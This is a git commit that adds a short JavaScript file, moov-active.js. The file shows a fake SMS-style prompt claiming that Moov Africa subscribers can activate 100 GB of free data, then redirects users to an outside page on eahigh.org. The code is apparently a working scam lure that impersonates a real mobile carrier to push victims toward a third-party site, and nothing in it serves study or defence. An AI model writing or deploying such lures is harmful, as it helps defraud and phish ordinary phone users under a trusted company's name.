c55375f543e810807d265daf2c77fcaeb0130537
dhatablog <williamsnsiako@gmail.com>
2025-09-25 21:24:54 +0100

    Create moov-active.js

---
+++ moov-active.js
@@ -0,0 +1,5 @@
+var password = 'Activer 100 Go'
+password=prompt('SMS: Félicitations, votre carte SIM Moov Africa est éligible pour recevoir des données gratuites en récompense de votre ancienne carte SIM, cliquez sur OK pour activer','Activer 100 Go');
+if (password != 'Activer 100 Go') {
+location.href='https://eahigh.org/moov.html';
+}
